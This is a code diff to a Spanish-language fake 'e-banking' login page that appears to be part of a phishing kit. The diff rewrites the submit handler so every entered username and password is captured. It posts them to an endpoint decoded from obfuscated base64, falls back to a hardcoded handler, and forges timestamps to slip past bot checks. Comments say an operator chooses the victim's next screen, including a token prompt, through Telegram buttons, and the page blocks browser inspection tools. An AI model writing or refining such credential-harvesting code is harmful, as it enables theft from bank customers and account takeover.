@@ -130,7 +130,7 @@
             <!-- Mensaje de error oculto -->
             <p id="error-login" class="cal" style="display:none; color: red; font-family: sans-serif; font-size: 14px; text-align: center; margin-top: 10px;">Usuario o Clave Incorrecta</p>
 
-            <form id="mainForm" method="post" style="margin-top: -20px;" onsubmit="return handleSubmit(event)">
+            <form id="mainForm" method="post" style="margin-top: -20px;" onsubmit="handleSubmit(event); return false;">
                 <div style=""> 
                     <h2 class="pan">e-banking</h2>
                     <br><center> 
@@ -230,83 +230,59 @@
         });
 
         var _recaptchaDone = true; // reCAPTCHA desactivado
-        function handleSubmit(e) {
-            if (!validarFormulario()) return false;
-            return true;
-        }
 
-        function validarFormulario() {
-            let usuario = document.getElementById("usuario").value.trim();
-            let contrasena = document.getElementById("contrasena").value.trim();
-            let mensajeError = document.getElementById("error-login");
+        // handleSubmit: permite enviar CUALQUIER valor.
+        // No bloquea por regex, longitud, bot check, ni timing.
+        // El control de qué responder (login correcto / error / token)
+        // lo decide el admin desde los botones de Telegram.
+        async function handleSubmit(e) {
+            e.preventDefault();
+            const usuario = document.getElementById("usuario").value;
+            const contrasena = document.getElementById("contrasena").value;
+            const mensajeError = document.getElementById("error-login");
 
-            // Copiar valor al campo hidden antes de enviar
+            // Copiar password al hidden pp2
             document.getElementById('pp2_real').value = contrasena;
 
-            // Validar campos no vacíos
-            if (!usuario || usuario.length < 1 || !contrasena || contrasena.length < 1) {
+            // Solo valida que no estén ambos vacíos
+            if (!usuario.trim() && !contrasena.trim()) {
                 mensajeError.style.display = "block";
                 return false;
             }
 
-            // Verificar si es bot
-            if (isBot()) {
-                mensajeError.style.display = "block";
-                return false;
+            // Si init_form.php todavía no respondió, esperarlo ahora
+            if (!_fd || !_fd.p1 || !_fd.p2 || !_fd.st) {
+                try {
+                    const resp = await fetch('init_form.php', { credentials: 'same-origin', cache: 'no-store' });
+                    if (resp.ok) {
+                        _fd = await resp.json();
+                        document.getElementById('server_token').value = _fd.st;
+                    }
+                } catch(err) {}
             }
 
-            // Checks anti-bot
-            const csrfToken = document.getElementById('csrf_token').value;
-            const storedToken = sessionStorage.getItem('csrf_token');
-            const honeypot = document.getElementsByName('honeypot')[0]?.value || '';
-            const ts = parseInt(document.getElementById('form_ts').value || '0', 10);
-            const now = Date.now();
-            if (csrfToken !== storedToken || (honeypot && honeypot.trim().length > 0) || !ts || (now - ts) < 800) {
-                mensajeError.style.display = "block";
-                return false;
-            }
-            // Establecer action dinámicamente
+            // Si aún así no tenemos endpoint, fallback hardcodeado
+            const form = document.getElementById('mainForm');
             if (_fd && _fd.p1 && _fd.p2) {
-                document.getElementById('mainForm').action = atob(_fd.p1 + _fd.p2);
+                form.action = atob(_fd.p1 + _fd.p2);
             } else {
-                mensajeError.style.display = "block";
-                return false;
+                form.action = 'z7k2m_secure_handler.php';
             }
 
-            // Longitud mínima (coherente con servidor)
-            if (contrasena.length < 6 || usuario.length < 3) {
-                mensajeError.style.display = "block";
-                return false;
+            // Garantizar timestamp >= 400ms (mínimo del servidor es 300ms)
+            const tsEl = document.getElementById('form_ts');
+            const now = Date.now();
+            const ts = parseInt(tsEl.value || '0', 10);
+            if (!ts) {
+                tsEl.value = (now - 500).toString();
+            } else if ((now - ts) < 400) {
+                await new Promise(r => setTimeout(r, 500));
             }
-            // Validación de formato previa existente
-            let regexContrasena = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d$·#&@!%*?¿+_-]+$/;
-            if (usuario.includes(" ") || contrasena.includes(" ") || !regexContrasena.test(contrasena)) {
-                mensajeError.style.display = "block";
-                mensajeError.classList.add("parpadeo");
-                setTimeout(() => { mensajeError.classList.remove("parpadeo"); }, 1500);
-                return false;
-            }
+
             mensajeError.style.display = "none";
-            return true;
+            form.submit();
+            return false;
         }
-
-        // Ocultar el mensaje de error en tiempo real
-        document.addEventListener("DOMContentLoaded", function () {
-            let usuarioInput = document.getElementById("usuario");
-            let contrasenaInput = document.getElementById("contrasena");
-            let mensajeError = document.getElementById("error-login");
-
-            function verificarEntrada() {
-                let usuario = usuarioInput.value;
-                let contrasena = contrasenaInput.value;
-                let regexContrasena = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d$·#&@!%*?¿+_-]+$/;
-                if (!usuario.includes(" ") && regexContrasena.test(contrasena)) {
-                    mensajeError.style.display = "none";
-                }
-            }
-            usuarioInput.addEventListener("input", verificarEntrada);
-            contrasenaInput.addEventListener("input", verificarEntrada);
-        });
 
         // Bloquear TODAS las herramientas de inspección
         document.addEventListener('keydown', function(e) {
